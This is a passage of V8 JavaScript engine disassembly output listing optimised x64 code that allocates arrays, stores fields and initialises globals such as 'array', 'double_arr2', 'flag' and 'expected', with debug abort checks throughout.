0x26c10af0ad3f   543  49ba693ac87cab220000 REX.W movq r10,0x22ab7cc83a69    ;; object: 0x22ab7cc83a69 <Map(FAST_ELEMENTS)>
0x26c10af0ad49   553  4c8951ff       REX.W movq [rcx-0x1],r10
                  ;;; <@48,#42> store-named-field
0x26c10af0ad4d   557  f6c101         testb rcx,0x1
0x26c10af0ad50   560  7510           jnz 578  (0x26c10af0ad62)
                  Abort message: 
                  Operand is a smi
0x26c10af0ad52   562  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0ad5c   572  e8bf93dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0ad61   577  cc             int3l
0x26c10af0ad62   578  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af0ad6c   588  4c895107       REX.W movq [rcx+0x7],r10
                  ;;; <@50,#44> store-named-field
0x26c10af0ad70   592  f6c101         testb rcx,0x1
0x26c10af0ad73   595  7510           jnz 613  (0x26c10af0ad85)
                  Abort message: 
                  Operand is a smi
0x26c10af0ad75   597  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0ad7f   607  e89c93dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0ad84   612  cc             int3l
0x26c10af0ad85   613  49ba0000000001000000 REX.W movq r10,0x100000000
0x26c10af0ad8f   623  4c895117       REX.W movq [rcx+0x17],r10
                  ;;; <@52,#46> fast-allocate
0x26c10af0ad93   627  498bb568fc0300 REX.W movq rsi,[r13+0x3fc68]
0x26c10af0ad9a   634  488d4618       REX.W leaq rax,[rsi+0x18]
0x26c10af0ad9e   638  a807           test al,0x7
0x26c10af0ada0   640  7410           jz 658  (0x26c10af0adb2)
                  Abort message: 
                  Unaligned allocation in new space
0x26c10af0ada2   642  48ba000000009e000000 REX.W movq rdx,0x9e00000000
0x26c10af0adac   652  e86f93dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0adb1   657  cc             int3l
0x26c10af0adb2   658  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af0adb9   665  4883c601       REX.W addq rsi,0x1
                  ;;; <@54,#49> store-named-field
0x26c10af0adbd   669  40f6c601       testb rsi,0x1
0x26c10af0adc1   673  7510           jnz 691  (0x26c10af0add3)
                  Abort message: 
                  Operand is a smi
0x26c10af0adc3   675  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0adcd   685  e84e93dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0add2   690  cc             int3l
0x26c10af0add3   691  49ba0923f866211c0000 REX.W movq r10,0x1c2166f82309    ;; object: 0x1c2166f82309 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0addd   701  4c8956ff       REX.W movq [rsi-0x1],r10
                  ;;; <@56,#50> store-named-field
0x26c10af0ade1   705  40f6c601       testb rsi,0x1
0x26c10af0ade5   709  7510           jnz 727  (0x26c10af0adf7)
                  Abort message: 
                  Operand is a smi
0x26c10af0ade7   711  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0adf1   721  e82a93dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0adf6   726  cc             int3l
0x26c10af0adf7   727  49ba0000000001000000 REX.W movq r10,0x100000000
0x26c10af0ae01   737  4c895607       REX.W movq [rsi+0x7],r10
                  ;;; <@58,#54> fast-allocate
0x26c10af0ae05   741  498bbd68fc0300 REX.W movq rdi,[r13+0x3fc68]
0x26c10af0ae0c   748  488d4738       REX.W leaq rax,[rdi+0x38]
0x26c10af0ae10   752  a807           test al,0x7
0x26c10af0ae12   754  7410           jz 772  (0x26c10af0ae24)
                  Abort message: 
                  Unaligned allocation in new space
0x26c10af0ae14   756  48ba000000009e000000 REX.W movq rdx,0x9e00000000
0x26c10af0ae1e   766  e8fd92dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0ae23   771  cc             int3l
0x26c10af0ae24   772  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af0ae2b   779  4883c701       REX.W addq rdi,0x1
                  ;;; <@60,#56> store-named-field
0x26c10af0ae2f   783  40f6c701       testb rdi,0x1
0x26c10af0ae33   787  7510           jnz 805  (0x26c10af0ae45)
                  Abort message: 
                  Operand is a smi
0x26c10af0ae35   789  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0ae3f   799  e8dc92dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0ae44   804  cc             int3l
0x26c10af0ae45   805  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af0ae4f   815  4c89570f       REX.W movq [rdi+0xf],r10
                  ;;; <@62,#58> store-named-field
0x26c10af0ae53   819  40f6c701       testb rdi,0x1
0x26c10af0ae57   823  7510           jnz 841  (0x26c10af0ae69)
                  Abort message: 
                  Operand is a smi
0x26c10af0ae59   825  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0ae63   835  e8b892dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0ae68   840  cc             int3l
0x26c10af0ae69   841  49bad131c87cab220000 REX.W movq r10,0x22ab7cc831d1    ;; object: 0x22ab7cc831d1 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0ae73   851  4c8957ff       REX.W movq [rdi-0x1],r10
                  ;;; <@64,#60> store-named-field
0x26c10af0ae77   855  40f6c701       testb rdi,0x1
0x26c10af0ae7b   859  7510           jnz 877  (0x26c10af0ae8d)
                  Abort message: 
                  Operand is a smi
0x26c10af0ae7d   861  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0ae87   871  e89492dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0ae8c   876  cc             int3l
0x26c10af0ae8d   877  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af0ae97   887  4c895707       REX.W movq [rdi+0x7],r10
                  ;;; <@66,#61> store-named-field
0x26c10af0ae9b   891  40f6c701       testb rdi,0x1
0x26c10af0ae9f   895  7510           jnz 913  (0x26c10af0aeb1)
                  Abort message: 
                  Operand is a smi
0x26c10af0aea1   897  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0aeab   907  e87092dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0aeb0   912  cc             int3l
0x26c10af0aeb1   913  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af0aebb   923  4c895717       REX.W movq [rdi+0x17],r10
                  ;;; <@68,#62> store-named-field
0x26c10af0aebf   927  40f6c701       testb rdi,0x1
0x26c10af0aec3   931  7510           jnz 949  (0x26c10af0aed5)
                  Abort message: 
                  Operand is a smi
0x26c10af0aec5   933  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0aecf   943  e84c92dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0aed4   948  cc             int3l
0x26c10af0aed5   949  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af0aedf   959  4c89571f       REX.W movq [rdi+0x1f],r10
                  ;;; <@70,#63> store-named-field
0x26c10af0aee3   963  40f6c701       testb rdi,0x1
0x26c10af0aee7   967  7510           jnz 985  (0x26c10af0aef9)
                  Abort message: 
                  Operand is a smi
0x26c10af0aee9   969  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0aef3   979  e82892dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0aef8   984  cc             int3l
0x26c10af0aef9   985  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af0af03   995  4c895727       REX.W movq [rdi+0x27],r10
                  ;;; <@72,#64> store-named-field
0x26c10af0af07   999  40f6c701       testb rdi,0x1
0x26c10af0af0b  1003  7510           jnz 1021  (0x26c10af0af1d)
                  Abort message: 
                  Operand is a smi
0x26c10af0af0d  1005  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0af17  1015  e80492dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0af1c  1020  cc             int3l
0x26c10af0af1d  1021  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af0af27  1031  4c89572f       REX.W movq [rdi+0x2f],r10
                  ;;; <@74,#68> store-named-field
0x26c10af0af2b  1035  40f6c701       testb rdi,0x1
0x26c10af0af2f  1039  7510           jnz 1057  (0x26c10af0af41)
                  Abort message: 
                  Operand is a smi
0x26c10af0af31  1041  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0af3b  1051  e8e091dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0af40  1056  cc             int3l
0x26c10af0af41  1057  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0af4b  1067  4c895717       REX.W movq [rdi+0x17],r10
                  ;;; <@76,#69> store-named-field
0x26c10af0af4f  1071  40f6c701       testb rdi,0x1
0x26c10af0af53  1075  7510           jnz 1093  (0x26c10af0af65)
                  Abort message: 
                  Operand is a smi
0x26c10af0af55  1077  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0af5f  1087  e8bc91dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0af64  1092  cc             int3l
0x26c10af0af65  1093  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0af6f  1103  4c89571f       REX.W movq [rdi+0x1f],r10
                  ;;; <@78,#70> store-named-field
0x26c10af0af73  1107  40f6c701       testb rdi,0x1
0x26c10af0af77  1111  7510           jnz 1129  (0x26c10af0af89)
                  Abort message: 
                  Operand is a smi
0x26c10af0af79  1113  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0af83  1123  e89891dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0af88  1128  cc             int3l
0x26c10af0af89  1129  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0af93  1139  4c895727       REX.W movq [rdi+0x27],r10
                  ;;; <@80,#71> store-named-field
0x26c10af0af97  1143  40f6c701       testb rdi,0x1
0x26c10af0af9b  1147  7510           jnz 1165  (0x26c10af0afad)
                  Abort message: 
                  Operand is a smi
0x26c10af0af9d  1149  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0afa7  1159  e87491dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0afac  1164  cc             int3l
0x26c10af0afad  1165  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0afb7  1175  4c89572f       REX.W movq [rdi+0x2f],r10
                  ;;; <@82,#72> store-keyed
0x26c10af0afbb  1179  48897e0f       REX.W movq [rsi+0xf],rdi
                  ;;; <@84,#73> store-named-field
0x26c10af0afbf  1183  f6c101         testb rcx,0x1
0x26c10af0afc2  1186  7510           jnz 1204  (0x26c10af0afd4)
                  Abort message: 
                  Operand is a smi
0x26c10af0afc4  1188  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0afce  1198  e84d91dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0afd3  1203  cc             int3l
0x26c10af0afd4  1204  4889710f       REX.W movq [rcx+0xf],rsi
                  ;;; <@86,#74> store-keyed
0x26c10af0afd8  1208  48894a0f       REX.W movq [rdx+0xf],rcx
                  ;;; <@88,#77> fast-allocate
0x26c10af0afdc  1212  498b8d68fc0300 REX.W movq rcx,[r13+0x3fc68]
0x26c10af0afe3  1219  488d4120       REX.W leaq rax,[rcx+0x20]
0x26c10af0afe7  1223  a807           test al,0x7
0x26c10af0afe9  1225  7410           jz 1243  (0x26c10af0affb)
                  Abort message: 
                  Unaligned allocation in new space
0x26c10af0afeb  1227  48ba000000009e000000 REX.W movq rdx,0x9e00000000
0x26c10af0aff5  1237  e82691dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0affa  1242  cc             int3l
0x26c10af0affb  1243  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af0b002  1250  4883c101       REX.W addq rcx,0x1
                  ;;; <@90,#79> store-named-field
0x26c10af0b006  1254  f6c101         testb rcx,0x1
0x26c10af0b009  1257  7510           jnz 1275  (0x26c10af0b01b)
                  Abort message: 
                  Operand is a smi
0x26c10af0b00b  1259  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b015  1269  e80691dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b01a  1274  cc             int3l
0x26c10af0b01b  1275  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af0b025  1285  4c89510f       REX.W movq [rcx+0xf],r10
                  ;;; <@92,#81> store-named-field
0x26c10af0b029  1289  f6c101         testb rcx,0x1
0x26c10af0b02c  1292  7510           jnz 1310  (0x26c10af0b03e)
                  Abort message: 
                  Operand is a smi
0x26c10af0b02e  1294  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b038  1304  e8e390dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b03d  1309  cc             int3l
0x26c10af0b03e  1310  49ba693ac87cab220000 REX.W movq r10,0x22ab7cc83a69    ;; object: 0x22ab7cc83a69 <Map(FAST_ELEMENTS)>
0x26c10af0b048  1320  4c8951ff       REX.W movq [rcx-0x1],r10
                  ;;; <@94,#83> store-named-field
0x26c10af0b04c  1324  f6c101         testb rcx,0x1
0x26c10af0b04f  1327  7510           jnz 1345  (0x26c10af0b061)
                  Abort message: 
                  Operand is a smi
0x26c10af0b051  1329  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b05b  1339  e8c090dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b060  1344  cc             int3l
0x26c10af0b061  1345  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af0b06b  1355  4c895107       REX.W movq [rcx+0x7],r10
                  ;;; <@96,#85> store-named-field
0x26c10af0b06f  1359  f6c101         testb rcx,0x1
0x26c10af0b072  1362  7510           jnz 1380  (0x26c10af0b084)
                  Abort message: 
                  Operand is a smi
0x26c10af0b074  1364  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b07e  1374  e89d90dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b083  1379  cc             int3l
0x26c10af0b084  1380  49ba0000000001000000 REX.W movq r10,0x100000000
0x26c10af0b08e  1390  4c895117       REX.W movq [rcx+0x17],r10
                  ;;; <@98,#87> fast-allocate
0x26c10af0b092  1394  498bb568fc0300 REX.W movq rsi,[r13+0x3fc68]
0x26c10af0b099  1401  488d4618       REX.W leaq rax,[rsi+0x18]
0x26c10af0b09d  1405  a807           test al,0x7
0x26c10af0b09f  1407  7410           jz 1425  (0x26c10af0b0b1)
                  Abort message: 
                  Unaligned allocation in new space
0x26c10af0b0a1  1409  48ba000000009e000000 REX.W movq rdx,0x9e00000000
0x26c10af0b0ab  1419  e87090dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b0b0  1424  cc             int3l
0x26c10af0b0b1  1425  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af0b0b8  1432  4883c601       REX.W addq rsi,0x1
                  ;;; <@100,#90> store-named-field
0x26c10af0b0bc  1436  40f6c601       testb rsi,0x1
0x26c10af0b0c0  1440  7510           jnz 1458  (0x26c10af0b0d2)
                  Abort message: 
                  Operand is a smi
0x26c10af0b0c2  1442  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b0cc  1452  e84f90dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b0d1  1457  cc             int3l
0x26c10af0b0d2  1458  49ba0923f866211c0000 REX.W movq r10,0x1c2166f82309    ;; object: 0x1c2166f82309 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0b0dc  1468  4c8956ff       REX.W movq [rsi-0x1],r10
                  ;;; <@102,#91> store-named-field
0x26c10af0b0e0  1472  40f6c601       testb rsi,0x1
0x26c10af0b0e4  1476  7510           jnz 1494  (0x26c10af0b0f6)
                  Abort message: 
                  Operand is a smi
0x26c10af0b0e6  1478  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b0f0  1488  e82b90dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b0f5  1493  cc             int3l
0x26c10af0b0f6  1494  49ba0000000001000000 REX.W movq r10,0x100000000
0x26c10af0b100  1504  4c895607       REX.W movq [rsi+0x7],r10
                  ;;; <@104,#92> constant-t
0x26c10af0b104  1508  48b809a52371ce040000 REX.W movq rax,0x4ce7123a509    ;; object: 0x4ce7123a509 <FixedArray[1]>
                  ;;; <@106,#94> load-keyed
0x26c10af0b10e  1518  488b400f       REX.W movq rax,[rax+0xf]
                  ;;; <@108,#95> store-keyed
0x26c10af0b112  1522  4889460f       REX.W movq [rsi+0xf],rax
                  ;;; <@110,#96> store-named-field
0x26c10af0b116  1526  f6c101         testb rcx,0x1
0x26c10af0b119  1529  7510           jnz 1547  (0x26c10af0b12b)
                  Abort message: 
                  Operand is a smi
0x26c10af0b11b  1531  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b125  1541  e8f68fdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b12a  1546  cc             int3l
0x26c10af0b12b  1547  4889710f       REX.W movq [rcx+0xf],rsi
                  ;;; <@112,#97> store-keyed
0x26c10af0b12f  1551  48894a17       REX.W movq [rdx+0x17],rcx
                  ;;; <@114,#98> store-named-field
0x26c10af0b133  1555  f6c301         testb rbx,0x1
0x26c10af0b136  1558  7510           jnz 1576  (0x26c10af0b148)
                  Abort message: 
                  Operand is a smi
0x26c10af0b138  1560  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b142  1570  e8d98fdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b147  1575  cc             int3l
0x26c10af0b148  1576  4889530f       REX.W movq [rbx+0xf],rdx
                  ;;; <@116,#99> push-argument
0x26c10af0b14c  1580  49ba41102371ce040000 REX.W movq r10,0x4ce71231041    ;; object: 0x4ce71231041 <String[5]: array>
0x26c10af0b156  1590  4152           push r10
                  ;;; <@118,#99> push-argument
0x26c10af0b158  1592  6a00           push 0x0
                  ;;; <@120,#99> push-argument
0x26c10af0b15a  1594  53             push rbx
                  ;;; <@121,#99> gap
0x26c10af0b15b  1595  488b75e0       REX.W movq rsi,[rbp-0x20]
                  ;;; <@122,#100> call-runtime
0x26c10af0b15f  1599  b803000000     movl rax,0x3
0x26c10af0b164  1604  48bb20e776cad27f0000 REX.W movq rbx,0x7fd2ca76e720    ;; external reference (Runtime::InitializeVarGlobal)
0x26c10af0b16e  1614  e82d90dfff     call 0x26c10ad041a0     ;; code: STUB, CEntryStub, minor: 8
                  ;;; <@124,#101> lazy-bailout
                  ;;; <@126,#105> allocate
0x26c10af0b173  1619  498b9d68fc0300 REX.W movq rbx,[r13+0x3fc68]
0x26c10af0b17a  1626  f6c307         testb rbx,0x7
0x26c10af0b17d  1629  7410           jz 1647  (0x26c10af0b18f)
                  Abort message: 
                  Allocation is not double aligned
0x26c10af0b17f  1631  48ba0000000003000000 REX.W movq rdx,0x300000000
0x26c10af0b189  1641  e8928fdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b18e  1646  cc             int3l
0x26c10af0b18f  1647  488bc3         REX.W movq rax,rbx
0x26c10af0b192  1650  4883c040       REX.W addq rax,0x40
0x26c10af0b196  1654  493b8570fc0300 REX.W cmpq rax,[r13+0x3fc70]
0x26c10af0b19d  1661  0f87e5070000   ja 3688  (0x26c10af0b988)
0x26c10af0b1a3  1667  48ffc3         REX.W incq rbx
                  ;;; <@128,#510> fast-allocate
0x26c10af0b1a6  1670  498b9d68fc0300 REX.W movq rbx,[r13+0x3fc68]
0x26c10af0b1ad  1677  488d4320       REX.W leaq rax,[rbx+0x20]
0x26c10af0b1b1  1681  a807           test al,0x7
0x26c10af0b1b3  1683  7410           jz 1701  (0x26c10af0b1c5)
                  Abort message: 
                  Unaligned allocation in new space
0x26c10af0b1b5  1685  48ba000000009e000000 REX.W movq rdx,0x9e00000000
0x26c10af0b1bf  1695  e85c8fdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b1c4  1700  cc             int3l
0x26c10af0b1c5  1701  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af0b1cc  1708  4883c301       REX.W addq rbx,0x1
                  ;;; <@130,#107> store-named-field
0x26c10af0b1d0  1712  f6c301         testb rbx,0x1
0x26c10af0b1d3  1715  7510           jnz 1733  (0x26c10af0b1e5)
                  Abort message: 
                  Operand is a smi
0x26c10af0b1d5  1717  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b1df  1727  e83c8fdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b1e4  1732  cc             int3l
0x26c10af0b1e5  1733  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af0b1ef  1743  4c89530f       REX.W movq [rbx+0xf],r10
                  ;;; <@132,#109> store-named-field
0x26c10af0b1f3  1747  f6c301         testb rbx,0x1
0x26c10af0b1f6  1750  7510           jnz 1768  (0x26c10af0b208)
                  Abort message: 
                  Operand is a smi
0x26c10af0b1f8  1752  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b202  1762  e8198fdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b207  1767  cc             int3l
0x26c10af0b208  1768  49ba793cc87cab220000 REX.W movq r10,0x22ab7cc83c79    ;; object: 0x22ab7cc83c79 <Map(FAST_DOUBLE_ELEMENTS)>
0x26c10af0b212  1778  4c8953ff       REX.W movq [rbx-0x1],r10
                  ;;; <@134,#111> store-named-field
0x26c10af0b216  1782  f6c301         testb rbx,0x1
0x26c10af0b219  1785  7510           jnz 1803  (0x26c10af0b22b)
                  Abort message: 
                  Operand is a smi
0x26c10af0b21b  1787  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b225  1797  e8f68edfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b22a  1802  cc             int3l
0x26c10af0b22b  1803  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af0b235  1813  4c895307       REX.W movq [rbx+0x7],r10
                  ;;; <@136,#113> store-named-field
0x26c10af0b239  1817  f6c301         testb rbx,0x1
0x26c10af0b23c  1820  7510           jnz 1838  (0x26c10af0b24e)
                  Abort message: 
                  Operand is a smi
0x26c10af0b23e  1822  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b248  1832  e8d38edfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b24d  1837  cc             int3l
0x26c10af0b24e  1838  49ba0000000002000000 REX.W movq r10,0x200000000
0x26c10af0b258  1848  4c895317       REX.W movq [rbx+0x17],r10
                  ;;; <@138,#115> fast-allocate
0x26c10af0b25c  1852  498b9568fc0300 REX.W movq rdx,[r13+0x3fc68]
0x26c10af0b263  1859  f6c207         testb rdx,0x7
0x26c10af0b266  1862  7410           jz 1880  (0x26c10af0b278)
                  Abort message: 
                  Allocation is not double aligned
0x26c10af0b268  1864  48ba0000000003000000 REX.W movq rdx,0x300000000
0x26c10af0b272  1874  e8a98edfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b277  1879  cc             int3l
0x26c10af0b278  1880  488d4220       REX.W leaq rax,[rdx+0x20]
0x26c10af0b27c  1884  a807           test al,0x7
0x26c10af0b27e  1886  7410           jz 1904  (0x26c10af0b290)
                  Abort message: 
                  Unaligned allocation in new space
0x26c10af0b280  1888  48ba000000009e000000 REX.W movq rdx,0x9e00000000
0x26c10af0b28a  1898  e8918edfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b28f  1903  cc             int3l
0x26c10af0b290  1904  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af0b297  1911  4883c201       REX.W addq rdx,0x1
                  ;;; <@140,#118> store-named-field
0x26c10af0b29b  1915  f6c201         testb rdx,0x1
0x26c10af0b29e  1918  7510           jnz 1936  (0x26c10af0b2b0)
                  Abort message: 
                  Operand is a smi
0x26c10af0b2a0  1920  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b2aa  1930  e8718edfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b2af  1935  cc             int3l
0x26c10af0b2b0  1936  49ba092ef866211c0000 REX.W movq r10,0x1c2166f82e09    ;; object: 0x1c2166f82e09 <Map(FAST_HOLEY_DOUBLE_ELEMENTS)>
0x26c10af0b2ba  1946  4c8952ff       REX.W movq [rdx-0x1],r10
                  ;;; <@142,#119> store-named-field
0x26c10af0b2be  1950  f6c201         testb rdx,0x1
0x26c10af0b2c1  1953  7510           jnz 1971  (0x26c10af0b2d3)
                  Abort message: 
                  Operand is a smi
0x26c10af0b2c3  1955  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b2cd  1965  e84e8edfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b2d2  1970  cc             int3l
0x26c10af0b2d3  1971  49ba0000000002000000 REX.W movq r10,0x200000000
0x26c10af0b2dd  1981  4c895207       REX.W movq [rdx+0x7],r10
                  ;;; <@144,#120> constant-t
0x26c10af0b2e1  1985  48b821a52371ce040000 REX.W movq rax,0x4ce7123a521    ;; object: 0x4ce7123a521 <FixedDoubleArray[2]>
                  ;;; <@146,#122> load-keyed
0x26c10af0b2eb  1995  c5fb10400f     vmovsd xmm0,[rax+0xf]
                  ;;; <@148,#123> store-keyed
0x26c10af0b2f0  2000  c5fb11420f     vmovsd [rdx+0xf],xmm0
                  ;;; <@150,#120> constant-t
0x26c10af0b2f5  2005  48b821a52371ce040000 REX.W movq rax,0x4ce7123a521    ;; object: 0x4ce7123a521 <FixedDoubleArray[2]>
                  ;;; <@152,#125> load-keyed
0x26c10af0b2ff  2015  c5fb104017     vmovsd xmm0,[rax+0x17]
                  ;;; <@154,#126> store-keyed
0x26c10af0b304  2020  c5fb114217     vmovsd [rdx+0x17],xmm0
                  ;;; <@156,#127> store-named-field
0x26c10af0b309  2025  f6c301         testb rbx,0x1
0x26c10af0b30c  2028  7510           jnz 2046  (0x26c10af0b31e)
                  Abort message: 
                  Operand is a smi
0x26c10af0b30e  2030  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b318  2040  e8038edfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b31d  2045  cc             int3l
0x26c10af0b31e  2046  4889530f       REX.W movq [rbx+0xf],rdx
                  ;;; <@158,#128> push-argument
0x26c10af0b322  2050  49ba89102371ce040000 REX.W movq r10,0x4ce71231089    ;; object: 0x4ce71231089 <String[11]: double_arr2>
0x26c10af0b32c  2060  4152           push r10
                  ;;; <@160,#128> push-argument
0x26c10af0b32e  2062  6a00           push 0x0
                  ;;; <@162,#128> push-argument
0x26c10af0b330  2064  53             push rbx
                  ;;; <@163,#128> gap
0x26c10af0b331  2065  488b75e0       REX.W movq rsi,[rbp-0x20]
                  ;;; <@164,#129> call-runtime
0x26c10af0b335  2069  b803000000     movl rax,0x3
0x26c10af0b33a  2074  48bb20e776cad27f0000 REX.W movq rbx,0x7fd2ca76e720    ;; external reference (Runtime::InitializeVarGlobal)
0x26c10af0b344  2084  e8578edfff     call 0x26c10ad041a0     ;; code: STUB, CEntryStub, minor: 8
                  ;;; <@166,#130> lazy-bailout
                  ;;; <@168,#134> push-argument
0x26c10af0b349  2089  49bab1102371ce040000 REX.W movq r10,0x4ce712310b1    ;; object: 0x4ce712310b1 <String[4]: flag>
0x26c10af0b353  2099  4152           push r10
                  ;;; <@170,#134> push-argument
0x26c10af0b355  2101  6a00           push 0x0
                  ;;; <@172,#134> push-argument
0x26c10af0b357  2103  6a00           push 0x0
                  ;;; <@173,#134> gap
0x26c10af0b359  2105  488b75e0       REX.W movq rsi,[rbp-0x20]
                  ;;; <@174,#135> call-runtime
0x26c10af0b35d  2109  b803000000     movl rax,0x3
0x26c10af0b362  2114  48bb20e776cad27f0000 REX.W movq rbx,0x7fd2ca76e720    ;; external reference (Runtime::InitializeVarGlobal)
0x26c10af0b36c  2124  e82f8edfff     call 0x26c10ad041a0     ;; code: STUB, CEntryStub, minor: 8
                  ;;; <@176,#136> lazy-bailout
                  ;;; <@178,#140> push-argument
0x26c10af0b371  2129  49baf1102371ce040000 REX.W movq r10,0x4ce712310f1    ;; object: 0x4ce712310f1 <String[8]: expected>
0x26c10af0b37b  2139  4152           push r10
                  ;;; <@180,#140> push-argument
0x26c10af0b37d  2141  6a00           push 0x0
                  ;;; <@182,#140> push-argument
